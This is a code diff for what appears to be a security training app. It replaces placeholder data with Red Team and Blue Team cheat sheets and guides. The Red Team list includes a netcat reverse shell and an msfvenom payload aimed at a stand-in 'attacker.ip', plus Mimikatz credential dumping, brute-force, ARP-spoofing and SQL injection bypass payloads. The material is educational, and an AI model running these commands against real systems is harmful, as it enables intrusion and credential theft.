@@ -1,1110 +1,199 @@
-export const academyData: any = {
+export interface Cheat {
+  label: string;
+  cmd: string;
+  desc: string;
+}
+
+export interface Guide {
+  title: string;
+  text: string;
+}
+
+export interface TeamData {
+  description: string;
+  cheats: Cheat[];
+  guides: Guide[];
+}
+
+export const academyData: Record<string, TeamData> = {
   "Red Team": {
-    "description": "The Predator: Offensive Operations, Stealth Recon, and Exploitation Orchestration.",
-    "cheats": [
-      {
-        "label": "Nmap Stealth 1",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 2",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 3",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 4",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 5",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 6",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 7",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 8",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 9",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 10",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 11",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 12",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 13",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 14",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 15",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 16",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 17",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 18",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 19",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 20",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 21",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 22",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 23",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 24",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 25",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 26",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 27",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 28",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 29",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      },
-      {
-        "label": "Nmap Stealth 30",
-        "cmd": "nmap -sS -Pn",
-        "desc": "SYN Scan."
-      }
+    description: "Offensive security operations — learning to think like an attacker to find weaknesses before the bad guys do.",
+    cheats: [
+      { label: "Nmap Stealth Scan", cmd: "nmap -sS -T2 -p- 192.168.1.1", desc: "Perform a TCP SYN scan across all ports slowly to avoid detection." },
+      { label: "Nmap Service Detection", cmd: "nmap -sV -O 192.168.1.1", desc: "Fingerprint running services and guess the target operating system." },
+      { label: "Gobuster Directory Brute", cmd: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt", desc: "Discover hidden directories and files on a web server." },
+      { label: "SQLMap Basic Dump", cmd: "sqlmap -u 'http://target.com/page.php?id=1' --dbs", desc: "Automatically detect SQL injection and list available databases." },
+      { label: "Basic SQLi Bypass", cmd: "' OR '1'='1' --", desc: "Classic payload to bypass authentication via SQL injection." },
+      { label: "Netcat Reverse Shell", cmd: "nc -e /bin/sh attacker.ip 4444", desc: "Spawn a reverse shell back to your listener on port 4444." },
+      { label: "MSFVenom Payload", cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f elf > shell.elf", desc: "Generate a Linux reverse shell payload executable." },
+      { label: "Hydra SSH Brute", cmd: "hydra -l admin -P rockyou.txt ssh://192.168.1.1", desc: "Brute-force SSH credentials using a username and password list." },
+      { label: "Burp Intercept Toggle", cmd: "Ctrl + Shift + P", desc: "Quickly toggle request interception in Burp Suite Proxy." },
+      { label: "JWT None Algorithm", cmd: "{\"alg\":\"none\"}.\"payload\".", desc: "Test for JWT 'none' algorithm bypass by removing the signature." },
+      { label: "FFUF Subdomain Enum", cmd: "ffuf -u https://FUZZ.target.com -w subdomains.txt", desc: "Rapidly discover valid subdomains using fuzzing." },
+      { label: "LinPEAS PrivEsc", cmd: "./linpeas.sh", desc: "Run the Linux Privilege Escalation Awesome Script to find misconfigurations." },
+      { label: "WinPEAS PrivEsc", cmd: "winpeas.exe", desc: "Run the Windows Privilege Escalation Awesome Script." },
+      { label: "Mimikatz Dump", cmd: "mimikatz # sekurlsa::logonpasswords", desc: "Dump plaintext passwords and hashes from Windows memory." },
+      { label: "BloodHound Ingestor", cmd: "SharpHound.exe -c All", desc: "Collect Active Directory data for BloodHound analysis." },
+      { label: "Responder Poisoning", cmd: "responder -I eth0 -wrfv", desc: "Poison LLMNR, NBT-NS, and mDNS requests to capture hashes." },
+      { label: "Impacket PSExec", cmd: "impacket-psexec user:pass@target", desc: "Remote code execution via SMB using Impacket." },
+      { label: "CrackMapExec SMB", cmd: "crackmapexec smb 192.168.1.0/24 -u admin -p password", desc: "Test SMB credentials across a subnet." },
+      { label: "SearchSploit Query", cmd: "searchsploit apache 2.4", desc: "Search the Exploit-DB archive for known vulnerabilities." },
+      { label: "Aircrack WPA", cmd: "aircrack-ng capture.cap -w rockyou.txt", desc: "Crack WPA/WPA2 handshakes using a wordlist." },
+      { label: "Bettercap ARP Spoof", cmd: "bettercap -iface eth0 -eval 'set arp.spoof.targets 192.168.1.5; arp.spoof on'", desc: "Perform ARP spoofing to intercept network traffic." },
+      { label: "Hashcat Rule Attack", cmd: "hashcat -m 0 hashes.txt -r rules/best64.rule", desc: "Apply transformation rules to a wordlist for smarter cracking." }
     ],
-    "guides": [
-      {
-        "title": "Initial Access: Phishing Craft",
-        "text": "Mastering the art of credential harvesting through pixel-perfect clones and MFA bypass."
-      },
-      {
-        "title": "Bypassing EDR: Syscall Unhooking",
-        "text": "Techniques to evade CrowdStrike/SentinelOne by directly invoking kernel syscalls."
-      },
-      {
-        "title": "Active Directory: AS-REP Roasting",
-        "text": "Extracting hashes from users without Kerberos pre-authentication enabled."
-      },
-      {
-        "title": "Persistence: WMI Event Subs",
-        "text": "Establishing stealthy persistence on Windows via WMI event triggers."
-      },
-      {
-        "title": "Lateral Movement: Overpass-the-Hash",
-        "text": "Using NTLM hashes to request Kerberos TGTs for seamless domain movement."
-      },
-      {
-        "title": "Exfiltration: DNS Tunneling",
-        "text": "Bypassing firewalls by fragmenting data into DNS TXT records."
-      },
-      {
-        "title": "C2 Infrastructure: Cobalt Strike",
-        "text": "Designing redirected and domain-fronted command and control arrays."
-      },
-      {
-        "title": "Web Logic: JWT Forgery",
-        "text": "Exploiting weak signing keys to elevate privileges in modern web apps."
-      },
-      {
-        "title": "Cloud: Metadata SSRF",
-        "text": "Stealing IAM role tokens from AWS/Azure metadata services via server-side flaws."
-      },
-      {
-        "title": "Kerberos: Golden Ticket Ops",
-        "text": "Forging the ultimate domain credential after compromising the KRBTGT account."
-      },
-      {
-        "title": "Phishing: MOTW Bypass",
-        "text": "Using Mark-of-the-Web bypasses in ISO and VHD files to execute code."
-      },
-      {
-        "title": "PrivEsc: Linux DirtyPipe",
-        "text": "Exploiting kernel pipe vulnerabilities to overwrite read-only files like /etc/passwd."
-      },
-      {
-        "title": "Recon: OSINT Automation",
-        "text": "Building automated pipelines to scrape LinkedIn, Github, and S3 for leaks."
-      },
-      {
-        "title": "Exploitation: Buffer Overflows",
-        "text": "Crafting custom exploits for stack and heap based memory corruption."
-      },
-      {
-        "title": "Defense Evasion: AMSI Bypass",
-        "text": "Obfuscating PowerShell scripts to bypass the Anti-Malware Scan Interface."
-      },
-      {
-        "title": "Red Team: Operational Security",
-        "text": "Strict protocols for maintaining anonymity during high-stakes engagements."
-      },
-      {
-        "title": "Network: VLAN Hopping",
-        "text": "Exploiting DTP and double-tagging to jump between isolated network segments."
-      },
-      {
-        "title": "Database: SQLi to RCE",
-        "text": "Escalating simple SQL injection into a full operating system shell."
-      },
-      {
-        "title": "API: IDOR Chain",
-        "text": "Chaining insecure object references to dump entire user databases."
-      },
-      {
-        "title": "Wireless: WPA3 SAE Attacks",
-        "text": "The latest methodologies for attacking WPA3-protected networks."
-      },
-      {
-        "title": "Mobile: Android IPC Exploits",
-        "text": "Intercepting and manipulating intents to leak private application data."
-      },
-      {
-        "title": "Container: Escape to Host",
-        "text": "Using misconfigured Docker sockets to gain root on the host machine."
-      },
-      {
-        "title": "Social-Eng: Pretext Design",
-        "text": "The psychology of influence: Crafting believable personas for phone/email ops."
-      },
-      {
-        "title": "Post-Ex: BloodHound Analysis",
-        "text": "Visualizing attack paths in Active Directory using graph theory."
-      },
-      {
-        "title": "Stealth: Beacon Jitter",
-        "text": "Optimizing sleep and jitter patterns to evade behavioral traffic analysis."
-      },
-      {
-        "title": "Payload: Cobalt Strike Profiles",
-        "text": "Customizing malleable C2 profiles to look like legitimate traffic."
-      },
-      {
-        "title": "Linux: Capability Abuse",
-        "text": "Exploiting setcap binaries to gain root privileges without SUID."
-      },
-      {
-        "title": "Red Team: Physical Security",
-        "text": "Lock picking, badge cloning, and social engineering for site access."
-      },
-      {
-        "title": "Exploit: Zero-Day Discovery",
-        "text": "Methodology for finding and documenting new vulnerabilities in software."
-      },
-      {
-        "title": "Command: The Red Team Lead",
-        "text": "Managing a multi-stage operation from planning to final exfiltration."
-      }
+    guides: [
+      { title: "The Red Team Mindset", text: "Red teaming is not about breaking things for fun. It is about simulating real adversaries to help organizations understand their true risk. A good red teamer thinks creatively, questions assumptions, and always has authorization before touching a target. The goal is to improve defense by demonstrating what is possible." },
+      { title: "Reconnaissance: Know Before You Strike", text: "Reconnaissance is the most important phase of any engagement. Passive recon collects information without touching the target — WHOIS records, social media, job postings, and certificate transparency logs. Active recon involves direct interaction: port scanning, banner grabbing, and directory brute-forcing. The more you know about the target's surface area, the more precise your attack will be." },
+      { title: "Web Application Attacks 101", text: "Web apps are the most common attack surface. The OWASP Top 10 lists the most critical risks: Injection (SQL, NoSQL, OS command), Broken Authentication, Sensitive Data Exposure, XML External Entities (XXE), Broken Access Control, Security Misconfiguration, Cross-Site Scripting (XSS), Insecure Deserialization, Using Components with Known Vulnerabilities, and Insufficient Logging. Understanding these categories gives you a roadmap for testing any web application." },
+      { title: "SQL Injection Deep Dive", text: "SQL injection occurs when untrusted user input is concatenated directly into a database query. There are several types: Union-based (extracting data via UNION SELECT), Error-based (using database errors to leak information), Boolean-based blind (inferring truth from page differences), and Time-based blind (using delays like SLEEP() to extract bits of data). Always use parameterized queries to prevent this vulnerability in your own code." },
+      { title: "Network Pivoting & Tunneling", text: "Once you compromise one host, the internal network opens up. Pivoting means routing traffic through the compromised host to reach internal resources. Tools like SSH dynamic port forwarding (-D), Chisel, Ligolo-ng, and Metasploit's autoroute can create tunnels. Understanding TCP/IP routing and proxychains is essential for moving through a network like a ghost." },
+      { title: "Privilege Escalation on Linux", text: "After gaining a low-privilege shell, the next goal is often root. Common Linux privilege escalation vectors include: SUID binaries, misconfigured sudo permissions, kernel exploits, cron jobs with weak permissions, writable PATH directories, and credentials stored in configuration files. Tools like LinPEAS and LinEnum automate the discovery of these misconfigurations." },
+      { title: "Privilege Escalation on Windows", text: "Windows privilege escalation often involves unquoted service paths, weak service permissions, AlwaysInstallElevated registry keys, kernel exploits, and credential harvesting. Tools like WinPEAS, PowerUp, and Watson help identify these paths. Understanding Windows access tokens, UAC bypasses, and DLL hijacking is critical for modern engagements." },
+      { title: "Active Directory Attacks", text: "Active Directory is the identity backbone of most enterprises. Common AD attacks include: Kerberoasting (requesting service tickets to crack offline), AS-REP Roasting, Pass-the-Hash, Pass-the-Ticket, Golden Ticket attacks, DCSync, and ACL abuse. BloodHound visualizes attack paths through AD, making it an indispensable tool for red teamers." },
+      { title: "Social Engineering & Phishing", text: "Technical skills are only half the battle. The human element is often the weakest link. Social engineering manipulates people into breaking security procedures. Phishing is the most common form — sending deceptive emails to harvest credentials or deploy malware. Red teamers may use tools like Gophish or Evilginx2 to simulate these attacks during authorized assessments." },
+      { title: "Wireless Penetration Testing", text: "Wireless networks extend the attack surface beyond physical walls. WPA2 can be cracked if the passphrase is weak. WPS is vulnerable to brute-force via Reaver or Bully. Rogue access points can trick users into connecting to malicious networks. For enterprise networks, attacking WPA-Enterprise and certificate validation flaws is common. Always test networks you own or have explicit permission to test." },
+      { title: "Password Cracking Strategies", text: "Password cracking transforms hashed credentials into plaintext. Dictionary attacks use common passwords. Rule-based attacks apply transformations (append numbers, leetspeak). Mask attacks target known patterns. Brute-force tries every combination. Understanding hash types (NTLM, bcrypt, SHA256) and selecting the right tool (Hashcat, John, Hydra) is essential for efficiency." },
+      { title: "Exploit Development Basics", text: "Writing exploits requires understanding memory, CPU registers, and program flow. Buffer overflows occur when data exceeds allocated space. Format string bugs leak memory. Use-After-Free vulnerabilities target heap management. Modern protections like ASLR, DEP/NX, and stack canaries make exploitation harder, requiring techniques like Return-Oriented Programming (ROP) and heap spraying." },
+      { title: "OSINT: Mapping the Target", text: "Open Source Intelligence (OSINT) is the collection of data from public sources. This includes search engines, social media, public records, domain registration, satellite imagery, and code repositories. A skilled OSINT practitioner can map an organization's infrastructure, find credentials in pastebin dumps, discover forgotten subdomains, and identify key personnel — all without sending a single packet to the target." },
+      { title: "Post-Exploitation & Persistence", text: "Gaining access is only the beginning. Post-exploitation involves looting data, escalating privileges, and establishing persistence. Persistence mechanisms include scheduled tasks, registry run keys, WMI event subscriptions, web shells, and backdoored service binaries. The goal is to maintain access even if the initial entry point is patched or discovered." },
+      { title: "Reporting & Professional Communication", text: "Your findings are worthless if you cannot communicate them. A good penetration test report includes: an executive summary (risk in business terms), technical findings (with proof-of-concept), risk ratings, and actionable remediation advice. Include screenshots, command output, and clear step-by-step reproduction instructions. The report is your real deliverable and what clients pay for." },
+      { title: "Legal & Ethical Boundaries", text: "Ethical hacking operates within strict legal and moral boundaries. Always have written authorization before testing. Respect the scope defined in the rules of engagement. Do not access data unnecessarily. Report vulnerabilities responsibly. Understand laws like the Computer Fraud and Abuse Act (CFAA) in the US and equivalent legislation globally. A single unauthorized action can destroy your career and land you in prison." }
     ]
   },
   "Blue Team": {
-    "description": "The Guardian: Defensive Architecture, Incident Response, and Hardening.",
-    "cheats": [
-      {
-        "label": "UFW Firewall 1",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 2",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 3",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 4",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 5",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 6",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 7",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 8",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 9",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 10",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 11",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 12",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 13",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 14",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 15",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 16",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 17",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 18",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 19",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 20",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 21",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 22",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 23",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 24",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 25",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 26",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 27",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 28",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 29",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      },
-      {
-        "label": "UFW Firewall 30",
-        "cmd": "sudo ufw allow 22",
-        "desc": "Enable SSH."
-      }
+    description: "Defensive security architecture — building resilient systems, detecting intruders, and responding to incidents.",
+    cheats: [
+      { label: "List Active Connections", cmd: "ss -tulnp", desc: "Display all listening TCP and UDP sockets with process names." },
+      { label: "Check Running Processes", cmd: "ps auxf", desc: "Show all running processes in a tree format for easy analysis." },
+      { label: "Audit Auth Logins", cmd: "grep 'Accepted' /var/log/auth.log", desc: "Find successful SSH login attempts in the authentication log." },
+      { label: "Fail2Ban Status", cmd: "fail2ban-client status sshd", desc: "Check how many IPs are currently banned by Fail2Ban for SSH." },
+      { label: "TCPDump Capture", cmd: "tcpdump -i eth0 -w capture.pcap", desc: "Capture network traffic on eth0 to a file for later analysis." },
+      { label: "Audit SUID Binaries", cmd: "find / -perm -4000 -type f 2>/dev/null", desc: "Find all SUID binaries that could be used for privilege escalation." },
+      { label: "Check Cron Jobs", cmd: "crontab -l && cat /etc/crontab", desc: "List user and system scheduled tasks that could hide persistence." },
+      { label: "Wireshark HTTP Filter", cmd: "http.request.method == \"GET\"", desc: "Filter Wireshark to show only HTTP GET requests." },
+      { label: "Sysctl Kernel Hardening", cmd: "sysctl -w net.ipv4.icmp_echo_ignore_all=1", desc: "Disable ICMP echo replies (ping) to reduce network visibility." },
+      { label: "Check Open Files", cmd: "lsof -i -P -n", desc: "List all open files associated with network connections." },
+      { label: "Audit User Accounts", cmd: "cat /etc/passwd | grep /bin/bash", desc: "List all users who have an interactive shell assigned." },
+      { label: "UFW Firewall Rules", cmd: "ufw status verbose", desc: "Display detailed Uncomplicated Firewall rules and defaults." },
+      { label: "AuditD Rules", cmd: "auditctl -l", desc: "List active Linux audit rules monitoring system calls." },
+      { label: "Check Kernel Modules", cmd: "lsmod", desc: "List loaded kernel modules that could hide rootkits." },
+      { label: "Windows Event Logins", cmd: "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624}", desc: "PowerShell command to list successful Windows logon events." },
+      { label: "Windows Running Services", cmd: "Get-Service | Where-Object {$_.Status -eq 'Running'}", desc: "List all running Windows services." },
+      { label: "Sysmon Config Check", cmd: "Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational -MaxEvents 10", desc: "Query the latest Sysmon events for suspicious activity." },
+      { label: "YARA Scan", cmd: "yara -r rule.yar /path/to/scan", desc: "Scan files using a YARA rule to detect malware patterns." },
+      { label: "Volatility Memory Dump", cmd: "volatility -f memory.dmp windows.pslist", desc: "List processes from a Windows memory dump using Volatility." },
+      { label: "Snort Test Rules", cmd: "snort -T -c /etc/snort/snort.conf", desc: "Validate Snort intrusion detection rules." },
+      { label: "ClamAV Scan", cmd: "clamscan -r /home", desc: "Recursively scan a directory for malware signatures." },
+      { label: "Check Listening Ports (Windows)", cmd: "netstat -ano | findstr LISTENING", desc: "Display all listening ports and associated PIDs on Windows." }
     ],
-    "guides": [
-      {
-        "title": "Hardening: The Zero Trust Model",
-        "text": "Implementing micro-segmentation and identity-based access control across the fleet."
-      },
-      {
-        "title": "Forensics: Volatility Memory",
-        "text": "Deep-dive into analyzing RAM dumps for rootkits and hidden processes."
-      },
-      {
-        "title": "Incident Response: Triaging",
-        "text": "A step-by-step guide to isolating and preserving evidence during a live breach."
-      },
-      {
-        "title": "Detection: Sigma Rule Logic",
-        "text": "Writing platform-independent detection rules for SIEM and EDR platforms."
-      },
-      {
-        "title": "Network: IDS/IPS Snort Tuning",
-        "text": "Reducing false positives and creating custom rules for modern attack vectors."
-      },
-      {
-        "title": "Compliance: CIS Benchmarks",
-        "text": "Auditing and hardening systems according to industry gold standards."
-      },
-      {
-        "title": "WAF: ModSecurity Engineering",
-        "text": "Building robust web application firewall rules to block zero-day exploits."
-      },
-      {
-        "title": "SIEM: ELK Pipeline Design",
-        "text": "Building scalable logging infrastructure using Elasticsearch, Logstash, and Kibana."
-      },
-      {
-        "title": "Malware: Static Analysis",
-        "text": "Deconstructing malware samples without executing them to find indicators of compromise."
-      },
-      {
-        "title": "Threat Hunting: DNS Anomalies",
-        "text": "Identifying C2 traffic by analyzing rare and fast-flux DNS queries."
-      },
-      {
-        "title": "Authentication: FIDO2/WebAuthn",
-        "text": "Implementing phishing-resistant multi-factor authentication systems."
-      },
-      {
-        "title": "Docker: Secure Registry Ops",
-        "text": "Scanning and signing container images to ensure supply chain integrity."
-      },
-      {
-        "title": "Kernel: Sysctl Security",
-        "text": "Optimizing the Linux kernel parameters for maximum network and memory resilience."
-      },
-      {
-        "title": "Identity: PAM Hardening",
-        "text": "Securing the Pluggable Authentication Module stack on Linux servers."
-      },
-      {
-        "title": "Logging: Auditd Mastery",
-        "text": "Configuring deep-level kernel auditing to track every file and process action."
-      },
-      {
-        "title": "Incident: Post-Mortem Design",
-        "text": "Learning from failure: How to conduct effective post-incident reviews."
-      },
-      {
-        "title": "Blue Team: Cloud Sentinel",
-        "text": "Monitoring and securing multi-cloud environments (AWS, GCP, Azure)."
-      },
-      {
-        "title": "Forensics: Disk Image Analysis",
-        "text": "Using Autopsy and Sleuthkit to recover deleted files and timelines."
-      },
-      {
-        "title": "Automation: Ansible Hardening",
-        "text": "Using infrastructure-as-code to enforce security baselines globally."
-      },
-      {
-        "title": "Email: SPF/DKIM/DMARC",
-        "text": "Implementing the ultimate defense against spoofing and email-based attacks."
-      },
-      {
-        "title": "OSINT: Defensive Monitoring",
-        "text": "Using OSINT tools to find leaked credentials and company assets on the web."
-      },
-      {
-        "title": "Vulnerability: Patch Pipelines",
-        "text": "Designing automated systems for 100% security update coverage."
-      },
-      {
-        "title": "Governance: ISO 27001 Intro",
-        "text": "Aligning technical security with international management standards."
-      },
-      {
-        "title": "Network: Zero Trust VPNs",
-        "text": "Transitioning from traditional VPNs to ZTNA (Zero Trust Network Access)."
-      },
-      {
-        "title": "Monitoring: Zabbix Security",
-        "text": "Building real-time dashboards for monitoring security-critical health metrics."
-      },
-      {
-        "title": "Blue Team: SOC Management",
-        "text": "Orchestrating teams and tools for a high-performance Security Operations Center."
-      },
-      {
-        "title": "Cryptographic Integrity",
-        "text": "Managing keys, rotations, and certificate lifecycles across the enterprise."
-      },
-      {
-        "title": "Data Loss Prevention (DLP)",
-        "text": "Techniques for identifying and blocking the unauthorized transfer of sensitive data."
-      },
-      {
-        "title": "Kubernetes: Falco Runtime",
-        "text": "Using Falco to detect anomalous container behavior in real-time."
-      },
-      {
-        "title": "The Blue Team Lead",
-        "text": "Managing defense strategies and leading incident response teams."
-      }
+    guides: [
+      { title: "The Blue Team Mindset", text: "Blue teamers are the guardians of the network. Their job is to prevent breaches, detect anomalies, and respond effectively when incidents occur. Unlike red teamers who focus on finding one path in, blue teamers must defend every possible path. This requires deep knowledge of systems, networks, logging, and human coordination." },
+      { title: "Defense in Depth", text: "No single security control is perfect. Defense in Depth is the strategy of layering multiple security controls so that if one fails, others still protect the asset. Layers include: physical security, network segmentation, endpoint protection, access controls, encryption, logging, and user awareness training. Think of it as a castle with a moat, walls, guards, and a vault." },
+      { title: "Log Analysis & SIEM", text: "Security Information and Event Management (SIEM) systems aggregate logs from across the environment to detect threats. Key log sources include: firewall logs, Windows Event Logs, authentication logs, web server logs, and DNS logs. Learning to write detection rules and hunt through telemetry is a core blue team skill. Common SIEM platforms include Splunk, ELK Stack, and Wazuh." },
+      { title: "Incident Response Phases", text: "When a breach is detected, structured response is critical. The NIST incident response lifecycle has four phases: Preparation (tools, training, playbooks), Detection & Analysis (identifying and scoping the incident), Containment Eradication & Recovery (stopping the attack and restoring systems), and Post-Incident Activity (lessons learned and report writing). Panic kills response times." },
+      { title: "Network Segmentation", text: "Flat networks are dangerous because one compromised host can reach everything. Segmentation divides the network into zones (DMZ, user LAN, server farm, management network) and restricts traffic between them with firewalls or ACLs. Micro-segmentation takes this further by enforcing policies between individual workloads. VLANs, subnets, and zero-trust architectures are key concepts." },
+      { title: "Endpoint Detection & Response", text: "EDR agents run on endpoints to monitor for malicious behavior in real time. They record process execution, file modifications, registry changes, and network connections. When an alert fires, analysts can trace the full attack chain. Popular EDR solutions include CrowdStrike, SentinelOne, Microsoft Defender for Endpoint, and open-source alternatives like Wazuh." },
+      { title: "Hardening Linux Servers", text: "Server hardening reduces the attack surface. Key steps include: keeping software patched, disabling unused services, enforcing strong SSH configurations (key auth, no root login, non-standard port), configuring a host-based firewall, setting up audit logging, removing SUID bits from unnecessary binaries, and applying the principle of least privilege. CIS benchmarks provide excellent hardening guides." },
+      { title: "Hardening Windows Environments", text: "Windows hardening involves configuring Group Policy, enabling Windows Defender with Attack Surface Reduction rules, applying EMET/WDAC policies, restricting PowerShell execution, disabling legacy protocols like SMBv1, enforcing strong authentication (Kerberos, NTLM restrictions), and maintaining rigorous patch management. The MITRE ATT&CK framework helps map defenses to attacker techniques." },
+      { title: "Threat Intelligence", text: "Threat intelligence is evidence-based knowledge about existing or emerging threats. It helps defenders understand attacker tactics, techniques, and procedures (TTPs). Frameworks like MITRE ATT&CK map these TTPs to standardized identifiers, making it easier to communicate about threats and build detections. IOCs (Indicators of Compromise) like IP addresses, file hashes, and domain names are tactical intelligence." },
+      { title: "Digital Forensics Fundamentals", text: "Forensics is the art of preserving, extracting, and analyzing digital evidence. The chain of custody must be maintained. Disk forensics examines filesystem artifacts. Memory forensics analyzes RAM dumps for malware and active processes. Network forensics reconstructs traffic from PCAP files. Tools include Autopsy, Volatility, Sleuth Kit, and Wireshark." },
+      { title: "Malware Analysis Intro", text: "Malware analysis can be static (examining code without execution) or dynamic (running the sample in a sandbox). Static analysis uses tools like strings, PEStudio, and IDA Pro. Dynamic analysis uses sandboxes like Cuckoo, Any.Run, or local VMs with monitoring tools. Understanding packers, obfuscation, and common API calls is essential for both approaches." },
+      { title: "Intrusion Detection Systems", text: "IDS solutions monitor network or host activity for malicious behavior. Network-based IDS (NIDS) like Snort and Suricata analyze traffic patterns against signature rules. Host-based IDS (HIDS) like OSSEC and Wazuh monitor file integrity, log anomalies, and rootkit activity. Modern systems combine both approaches with behavioral analytics." },
+      { title: "Identity & Access Management", text: "IAM is the practice of managing who can access what resources. Strong IAM includes: multi-factor authentication (MFA), role-based access control (RBAC), just-in-time access, regular access reviews, and privileged access management (PAM). Weak IAM is the root cause of many breaches, from credential stuffing to insider threats." },
